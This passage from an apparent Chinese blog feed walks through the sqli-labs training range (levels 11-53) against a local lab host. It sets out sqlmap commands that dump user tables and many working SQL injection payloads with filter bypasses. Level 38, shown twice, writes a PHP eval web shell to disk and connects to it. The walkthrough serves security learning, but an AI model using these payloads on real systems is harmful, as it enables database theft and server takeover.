&quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security -T users id,password,username -dump</span><br></pre></td></tr></table></figure><h2 id="12-Less-12"><a href="#12-Less-12" class="headerlink" title="12. Less-12"></a>12. Less-12</h2><p>和11题一样</p><h2 id="13-Less-13"><a href="#13-Less-13" class="headerlink" title="13. Less-13"></a>13. Less-13</h2><p>和11题一样</p><h2 id="14-Less-14"><a href="#14-Less-14" class="headerlink" title="14. Less-14"></a>14. Less-14</h2><p>和11题一样</p><h2 id="15-Less-15"><a href="#15-Less-15" class="headerlink" title="15. Less-15"></a>15. Less-15</h2><p>和11题一样，由于用到时间盲注，可能会很长时间</p><h2 id="16-Less-16"><a href="#16-Less-16" class="headerlink" title="16. Less-16"></a>16. Less-16</h2><p>套路不行，加<code>-level=2</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-11/&quot; --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security -T users id,password,username -dump -level=2</span><br></pre></td></tr></table></figure><h2 id="17-Less-17"><a href="#17-Less-17" class="headerlink" title="17. Less-17"></a>17. Less-17</h2><p>这道题已知账号是admin，其他和之前一样。</p><p>这道题我最后获取字段数据的时候，结果是NULL，然后用脚本跑出来了。</p><p>脚本在开头的那篇文章里。</p><h2 id="18-Less-18"><a href="#18-Less-18" class="headerlink" title="18. Less-18"></a>18. Less-18</h2><p>这道题的前提是知道账号和密码，要不然做不出来</p><p>账号：Dumb，密码：Dumb</p><p>这是一个header注入。注入点在UA里</p><p>得到数据库信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-18/&quot; --data=&quot;uname=Dumb&amp;passwd=Dumb、&amp;submit=Submit&quot; --user-agent=&quot;*&quot; --thread=10 --dbs</span><br></pre></td></tr></table></figure><p>其他的就一样了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-18/&quot; --data=&quot;uname=Dumb&amp;passwd=Dumb、&amp;submit=Submit&quot; --user-agent=&quot;*&quot; --thread=10 -D security -T users --columns id,password,username --dump</span><br></pre></td></tr></table></figure><p>如果得不到数据，或者报错就重刷数据库。</p><h2 id="19-Less-19"><a href="#19-Less-19" class="headerlink" title="19. Less-19"></a>19. Less-19</h2><p>这道题注入点在referer中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.3/sql-libs/Less-19/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --referer=&quot;*&quot; --thread=10 --dbs</span><br></pre></td></tr></table></figure><p>其他的也一样，改语句就行。</p><p>如果得不到数据，或者报错就重刷数据库。</p><h2 id="20-Less-20"><a href="#20-Less-20" class="headerlink" title="20. Less-20"></a>20. Less-20</h2><p>这道题注入点是在cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.1.3/sql-libs/Less-20/index.php --cookie=&quot;uname=admin&quot; --dbs -level=2</span><br></pre></td></tr></table></figure><p>其他的一样。</p><h2 id="21-Less-21"><a href="#21-Less-21" class="headerlink" title="21. Less-21"></a>21. Less-21</h2><p>还是cookie注入，但是用来base64编码。</p><p>我们用<code>--tamper &quot;base64encode.py&quot;</code>来加密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.1.3/sql-libs/Less-21/index.php --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; </span><br></pre></td></tr></table></figure><h2 id="22-Less-22"><a href="#22-Less-22" class="headerlink" title="22. Less-22"></a>22. Less-22</h2><p>和21题一样。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 工具 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-libs靶场Page-3(38-53)教程</title>
      <link href="/2023/02/16/13/"/>
      <url>/2023/02/16/13/</url>
      
        <content type="html"><![CDATA[<p>请先过page-1和page-2</p><h2 id="1-Less-38"><a href="#1-Less-38" class="headerlink" title="1. Less-38"></a>1. Less-38</h2><p>又是需要写木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;select &#x27;&lt;?php @eval($_POST[x])?&gt;&#x27; into outfile &#x27;D:\\SoftWare\\phpstudy_pro\\WWW\\sql-libs\\Less-38\\test.php&#x27;%23</span><br></pre></td></tr></table></figure><p>把木马写到目录下，密码是x</p><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程25.webp" alt=""></p><p>然后用蚁剑连上去就行了</p><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程26.webp" alt=""></p><p>成功！</p><h2 id="2-Less-39"><a href="#2-Less-39" class="headerlink" title="2. Less-39"></a>2. Less-39</h2><p>注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2</span><br></pre></td></tr></table></figure><p><code>order by</code> 获取字段数，然后联合注入一下就行</p><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程1.webp" alt=""></p><h2 id="3-Less-40"><a href="#3-Less-40" class="headerlink" title="3. Less-40"></a>3. Less-40</h2><p>注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and 1=2 ;00</span><br></pre></td></tr></table></figure><p>然后order by。联合注入</p><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程2.webp" alt=""></p><h2 id="4-Less-41"><a href="#4-Less-41" class="headerlink" title="4. Less-41"></a>4. Less-41</h2><p>和39题一样</p><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程3.webp" alt=""></p><h2 id="5-Less-42"><a href="#5-Less-42" class="headerlink" title="5. Less-42"></a>5. Less-42</h2><p>这个有点像24题啊，但是它只能进行登录，注册和密码都用不了。</p><p>我们随便输入一个账号密码登录进去发现会到达一个固定的页面。</p><p>我们密码和账号输入，因为我懒得去判断是账号存在还是密码存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123456&#x27;</span><br></pre></td></tr></table></figure><p>发现有报错</p><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程4.webp" alt=""></p><p>说明存在注入。</p><p>我们输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123456&#x27; #</span><br></pre></td></tr></table></figure><p>报错没有了</p><p>说明这就是注入点。</p><p>我们可以尝试用报错注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123456&#x27; and updatexml(1,concat(&#x27;~&#x27;,database()),1) #</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程5.webp" alt=""></p><h2 id="6-Less-43"><a href="#6-Less-43" class="headerlink" title="6. Less-43"></a>6. Less-43</h2><p>注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#x27;) #</span><br></pre></td></tr></table></figure><p>还是报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123456&#x27;) and updatexml(1,concat(&#x27;~&#x27;,database()),1) #</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程6.webp" alt=""></p><h2 id="7-Less-44"><a href="#7-Less-44" class="headerlink" title="7. Less-44"></a>7. Less-44</h2><p>这道题需要知道账号</p><p>账号 Dumb</p><p>密码处找注入点，找到是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1</span><br></pre></td></tr></table></figure><p>然后就能登录进去了</p><p>我们在密码处进行联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,3#</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程7.webp" alt=""></p><p>得到显错位，然后就是正常的联合注入了。</p><h2 id="8-Less-45"><a href="#8-Less-45" class="headerlink" title="8. Less-45"></a>8. Less-45</h2><p>账号：Dumb</p><p>密码处注入</p><p>注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) or 1=1 #</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程8.webp" alt=""></p><p>联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;) union select 1,2,3#</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程9.webp" alt=""></p><h2 id="9-Less-46"><a href="#9-Less-46" class="headerlink" title="9. Less-46"></a>9. Less-46</h2><p>这道题的URL参数是sort</p><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程10.webp" alt=""></p><p>我看到这儿有点懵，这道题啥意思？</p><p>然后发现 sort=4 的时候报错了。</p><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程11.webp" alt=""></p><p>sort=3 没有问题，根据报错的提示，我们可以知道字段数为3，虽然人家已经给我们看了。</p><p>既然有报错，那么我们可以用报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(&#x27;~&#x27;,(database()),&#x27;~&#x27;),1)</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程12.webp" alt=""></p><h2 id="10-Less-47"><a href="#10-Less-47" class="headerlink" title="10. Less-47"></a>10. Less-47</h2><p>和上一道题一样，应该还是报错注入。</p><p>按照逻辑来的话，上一题的是数字型注入，这道题应该就是字符串注入了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(database()),&#x27;~&#x27;),1) #</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程13.webp" alt=""></p><p>成功。</p><h2 id="11-Less-48"><a href="#11-Less-48" class="headerlink" title="11. Less-48"></a>11. Less-48</h2><p>这道题没有报错了。</p><p>用布尔盲注或者时间盲注都行</p><p>试试布尔盲注</p><p>发现 3 有回显，4 无回显，字段数为3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (length(database()))=8</span><br></pre></td></tr></table></figure><p>结果发现等于1000也有数据……</p><p>我们用时间盲注吧</p><p>结果也不行……</p><p>试了一下 and rand 结果还是不行，没搞懂这道题到底啥意思？</p><p>这道题卡关了。</p><h2 id="12-Less-49"><a href="#12-Less-49" class="headerlink" title="12. Less-49"></a>12. Less-49</h2><p>注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; #</span><br></pre></td></tr></table></figure><p>这道题和48题出现了同样的情况，没搞懂这题是干啥的</p><h2 id="13-Less-50"><a href="#13-Less-50" class="headerlink" title="13. Less-50"></a>13. Less-50</h2><p>这是一个简单的报错注入，注入点也好找。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(&#x27;~&#x27;,database()),1)</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程14.webp" alt=""></p><h2 id="14-Less-51"><a href="#14-Less-51" class="headerlink" title="14. Less-51"></a>14. Less-51</h2><p>注入点：</p><p>1’ —</p><p>报错注入就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1);%00</span><br></pre></td></tr></table></figure><p>注意这里不能用 ‘~’ 只能用 0x7e 来代替，不信可以自己试试</p><h2 id="15-Less-52"><a href="#15-Less-52" class="headerlink" title="15. Less-52"></a>15. Less-52</h2><p>注入点好找，数字型注入</p><p>然后就没看懂这题啥意思，好像是用时间盲注……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr(database(),1,1))=115 and sleep(1)</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程15.webp" alt=""></p><p>成了。</p><h2 id="16-Less-53"><a href="#16-Less-53" class="headerlink" title="16. Less-53"></a>16. Less-53</h2><p>这道题甚是离谱，这个注入少一个都弄不了……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (if(ascii(substr((select username from users where id=1),1,1))=115,0,sleep(1)))--+</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-338-53教程16.webp" alt=""></p><p>不要改，这道题好像就只能这么弄，少个加号都不行</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-libs靶场Page-2(21-38)教程</title>
      <link href="/2023/02/16/12/"/>
      <url>/2023/02/16/12/</url>
      
        <content type="html"><![CDATA[<p>请先过page1</p><h2 id="1-Less-21"><a href="#1-Less-21" class="headerlink" title="1. Less-21"></a>1. Less-21</h2><p>登录进去感觉好像和上一道题一样。</p><p>我们抓一下包</p><p>哎，这个cookie</p><p><img src="\media\2023\02\SQL-Libs靶场Page-11-22教程63.webp" alt=""></p><p>加密了一次，这应该是base64加密，我们解一下试试</p><p>![]\media\2023\02\SQL-Libs靶场Page-11-22教程64.webp)</p><p>我们现在的思路就是，把SQL语句加密一次，然后再传参。</p><p>注入方式是单引号括号注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) #</span><br></pre></td></tr></table></figure><p>我们找字段数</p><p><img src="\media\2023\02\SQL-Libs靶场Page-11-22教程65.webp" alt=""></p><p>这样得到加密数据</p><p><img src="\media\2023\02\SQL-Libs靶场Page-11-22教程66.webp" alt=""></p><p>得到显错位，然后就简单了，联合注入就行了。</p><h2 id="2-Less-22"><a href="#2-Less-22" class="headerlink" title="2. Less-22"></a>2. Less-22</h2><p>和上一道一样，单引号变双引号就行了。</p><h2 id="3-Less-23"><a href="#3-Less-23" class="headerlink" title="3. Less-23"></a>3. Less-23</h2><p>这道题我们正常的注入后发现不太对劲</p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-1.webp" alt=""></p><p>首先是只有单引号，单引号加注释这两种情况才有报错，所以单引号应该是没有问题的，有问题的是注释。</p><p>我们试了一下常规的注释 <code>--</code> 和 <code>#</code> 这两个都不行，尝试一下特殊的注释 <code>%00</code></p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-2.webp" alt=""></p><p>成功。</p><p>接下来就正常了</p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-3.webp" alt=""></p><p>联合注入就能搞。</p><h2 id="4-Less-24"><a href="#4-Less-24" class="headerlink" title="4. Less-24"></a>4. Less-24</h2><p>这道题的目的是，已知用户账号，但是不知道密码的情况下，修改目标密码并修改。</p><p>现在我们修改Dumb用户。</p><p>我们点击注册新账号</p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-4.webp" alt=""></p><p>进到一个界面，我们注册用户名为<code>Dumb&#39; #</code> ，密码是123456</p><p>我这里就是猜它的结构是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27;&#x27;&amp;password=&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>当我们用户名是<code>Dump&#39; #</code>就会发送一些神奇的变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27;Dumb&#x27; #&#x27;&amp;password=&#x27;&#x27;</span><br><span class="line">等同于</span><br><span class="line">username=&#x27;Dumb&#x27;</span><br></pre></td></tr></table></figure><p>所以我们实际上就是把Dumb用户给重新注册了。</p><p>当然，这里是单引号是我猜的哈，就是试一试看看行不行</p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-5.webp" alt=""></p><p>点击注册。</p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-6.webp" alt=""></p><p>注册成功。我们登录一下刚才注册的账号，<code>Dumb&#39; #</code></p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-7.webp" alt=""></p><p>这里要我们重置密码，我们把123456重置为654321</p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-8.webp" alt=""></p><p>然后点击重置</p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-9.webp" alt=""></p><p>重置成功</p><p>我们登录一下Dumb的账号</p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-10.webp" alt=""></p><p>然后点击登录</p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-11.webp" alt=""></p><p>卧槽，成了。</p><p>记得重置一下数据库</p><h2 id="5-Less-25"><a href="#5-Less-25" class="headerlink" title="5. Less-25"></a>5. Less-25</h2><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-12.webp" alt=""></p><p>这就是上一道题干出来的。我们重置一下数据库</p><p>这道题给提示了，and和or被过滤了，我们无视他，就当作不知道，从头分析</p><p>我们先正常注入，确定不是数字型注入，发现这个注释没问题。</p><p>单引号有报错，其他的啥事没有，确定是单引号注入。</p><p>排查过滤，引号没有，现在怀疑and或or被过滤，试试大写的，大写不行。</p><p>我们试试符号，and对应<code>&amp;&amp;</code>，or对应<code>||</code></p><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-13.webp" alt=""></p><p>成了。</p><p>然后发现了一个问题，o被过滤，order by不完整了。</p><p>其实这里还有一个方法</p><p>我们过滤的是 OR or AND and</p><p>我们输入 oorr 会发生什么？</p><p>oorr 过滤or后就是 or，同理 anandd 过滤后就是 and</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; oorrder by 3 -- </span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-2（21-38）教程-14.webp" alt=""></p><p>联合注入去吧！</p><h2 id="6-Less-25a"><a href="#6-Less-25a" class="headerlink" title="6. Less-25a"></a>6. Less-25a</h2><p>和上一道题差不多</p><p>注入方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; 1=1</span><br></pre></td></tr></table></figure><p>就是把上一道的注释和单引号去掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 oorrder by 3</span><br></pre></td></tr></table></figure><h2 id="7-Less-26"><a href="#7-Less-26" class="headerlink" title="7. Less-26"></a>7. Less-26</h2><p>下面就不一个一个分析了，直接告诉过滤啥</p><p>这道题 and or 和空格都被过滤掉了​，对了还有注释 — 和 #</p><p>注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;&amp;&amp;&#x27;1</span><br><span class="line">等同于</span><br><span class="line">1&#x27; and &#x27;1</span><br></pre></td></tr></table></figure><p>我们尝试使用报错注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||updatexml(1,concat(&#x27;~&#x27;, database()),1)||1=&#x27;1</span><br><span class="line">等同于·</span><br><span class="line">1&#x27; or updatexml(1,concat(&#x27;~&#x27;, database()),1) or 1=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程17.webp" alt=""></p><p>然后就简单了，正常的报错注入。</p><h2 id="8-Less-26a"><a href="#8-Less-26a" class="headerlink" title="8. Less-26a"></a>8. Less-26a</h2><p>注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;)anandd(&#x27;1</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程16.webp" alt=""></p><p>本来试试想用联合注入的，但是这玩意死活不给我出结果，就是报错，然后就用了布尔盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) anandd (length(database())=8) anandd (&#x27;1</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程15.webp" alt=""></p><p>可以跑。</p><p>然后就是常规的布尔盲注了。</p><h2 id="9-Less-27"><a href="#9-Less-27" class="headerlink" title="9. Less-27"></a>9. Less-27</h2><p>注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1</span><br></pre></td></tr></table></figure><p>过滤内容是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;nbsp;/* , – , # , 空格 , /，/s</span><br><span class="line">union、select、UNION、SELECT、Union、Select</span><br></pre></td></tr></table></figure><p>用联合注入就行了。</p><p>虽然union和select用不了，但是我们可以用 UnIoN 和 SeleCT 这样的。</p><p>这道题可以用报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||updatexml(1,concat(&#x27;~&#x27;, database()),1)||1=&#x27;1</span><br><span class="line">等同于·</span><br><span class="line">1&#x27; or updatexml(1,concat(&#x27;~&#x27;, database()),1) or 1=&#x27;1</span><br></pre></td></tr></table></figure><p>和26题一模一样。</p><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程18.webp" alt=""></p><p>其他的和正常的报错注入一样。</p><h2 id="10-Less-28"><a href="#10-Less-28" class="headerlink" title="10. Less-28"></a>10. Less-28</h2><p>注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and (&#x27;0</span><br></pre></td></tr></table></figure><p>没有报错信息，试试联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;)%0Auniunion%0Aselecton%0Aselect%0A1,2,3||(&#x27;</span><br><span class="line">这个就是</span><br><span class="line">0&#x27;) uniunion selecton select 1,2,3 or (&#x27;</span><br><span class="line">过滤之后就是</span><br><span class="line">0&#x27;) union select 1,2,3 or (&#x27;</span><br></pre></td></tr></table></figure><p>这个 %0A和 %0B功能差不多，有的时候 %0B 用不了就用 %0A</p><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程19.webp" alt=""></p><p>得到显错位。然后就联合注入了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;)%0Auniunion%0Aselecton%0Aselect%0A1,database(),3||(&#x27;</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程20.webp" alt=""></p><h2 id="11-Less-28a"><a href="#11-Less-28a" class="headerlink" title="11. Less-28a"></a>11. Less-28a</h2><p>和上一题的代码一模一样。</p><h2 id="12-Less-29"><a href="#12-Less-29" class="headerlink" title="12. Less-29"></a>12. Less-29</h2><p>这道题它……一上来说自己是世界最好的防火墙，我都准备好整那些奇奇怪怪的过滤了，结果你丫就是个普普通通的字符串注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1 --</span><br></pre></td></tr></table></figure><p>啥也没过滤，直接上就行了。</p><h2 id="13-Less-30"><a href="#13-Less-30" class="headerlink" title="13. Less-30"></a>13. Less-30</h2><p>世界上最好的防火墙……</p><p>我估计知道是什么货色了，估计就是把上一道题的闭合方式改了一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; and 1=1 --</span><br></pre></td></tr></table></figure><p>双引号闭合，联合注入就行</p><h2 id="14-Less-31"><a href="#14-Less-31" class="headerlink" title="14. Less-31"></a>14. Less-31</h2><p>世界上最好的WAF</p><p>我猜啊，这个应该是加括号了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) and 1=2 --</span><br></pre></td></tr></table></figure><h2 id="15-Less-32"><a href="#15-Less-32" class="headerlink" title="15. Less-32"></a>15. Less-32</h2><p>这道题是宽字节注入，单引号被转义了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df&#x27; and 1=1 --</span><br></pre></td></tr></table></figure><p>注入的话联合注入就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df&#x27; union select 1,database(),3 -- </span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程21.webp" alt=""></p><h2 id="16-Less-33"><a href="#16-Less-33" class="headerlink" title="16. Less-33"></a>16. Less-33</h2><p>和上一道题一样。</p><h2 id="17-Less-34"><a href="#17-Less-34" class="headerlink" title="17. Less-34"></a>17. Less-34</h2><p>熟悉的登录界面</p><p>这是一个post宽字节注入。</p><p>这里我们用一个新方法，把 ‘ 变成 �’，嘿嘿嘿</p><p>这个是把 UTF8 的 ‘ 变成了 UTF16 的 �’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin�&#x27; or 1=1 #</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程23.webp" alt=""></p><h2 id="18-Less-35"><a href="#18-Less-35" class="headerlink" title="18. Less-35"></a>18. Less-35</h2><p>简单的数字型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=1</span><br></pre></td></tr></table></figure><h2 id="19-Less-36"><a href="#19-Less-36" class="headerlink" title="19. Less-36"></a>19. Less-36</h2><p>宽字符注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1�&#x27; and 1=2 --</span><br></pre></td></tr></table></figure><h2 id="20-Less-37"><a href="#20-Less-37" class="headerlink" title="20. Less-37"></a>20. Less-37</h2><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程24.webp" alt=""></p><p>和34题一样。</p><h2 id="21-Less-38"><a href="#21-Less-38" class="headerlink" title="21. Less-38"></a>21. Less-38</h2><p>又是需要写木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;select &#x27;&lt;?php @eval($_POST[x])?&gt;&#x27; into outfile &#x27;D:\\SoftWare\\phpstudy_pro\\WWW\\sql-libs\\Less-38\\test.php&#x27;%23</span><br></pre></td></tr></table></figure><p>把木马写到目录下，密码是x</p><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程25.webp" alt=""></p><p>然后用蚁剑连上去就行了</p><p><img src="\media\2023\02\sql-libs靶场Page-221-38教程26.webp" alt=""></p><p>成功！</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-libs靶场Page-1(1-22)教程</title>
      <link href="/2023/02/16/11/"/>
      <url>/2023/02/16/11/</url>
      
